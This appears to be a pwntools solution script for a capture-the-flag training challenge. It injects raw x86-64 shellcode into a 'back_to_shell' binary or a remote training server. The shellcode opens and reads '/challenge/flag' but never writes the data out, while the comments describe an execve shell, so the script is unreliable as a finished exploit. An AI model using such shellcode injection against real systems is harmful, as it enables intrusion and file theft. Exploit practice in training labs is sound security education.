from pwn import *

COMMANDS = """
b*0x40116e
continue
"""
shellcode = b"\x48\xB8\x67\x65\x2F\x66\x6C\x61\x67\x00\x50\x48\xB8\x2F\x63\x68\x61\x6C\x6C\x65\x6E\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\x81\xEC\x00\x01\x00\x00\x48\x89\xE6\x48\xC7\xC2\x00\x01\x00\x00\x48\x31\xC0\x0F\x05"

#ncat --ssl back-to-shell.training.offensivedefensive.it 8080
if args.GDB:
    p = gdb.debug("./back_to_shell", gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("back-to-shell.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./back_to_shell")
p.send(shellcode)
p.interactive()

#0x40116e

#execve("/bin/sh\0", NULL, NULL)

#(rdi, rsi, rdx), r10, r8, r9
#const char *filename, const char *const *argv, const char *const *envp

0x7ffeeec9e500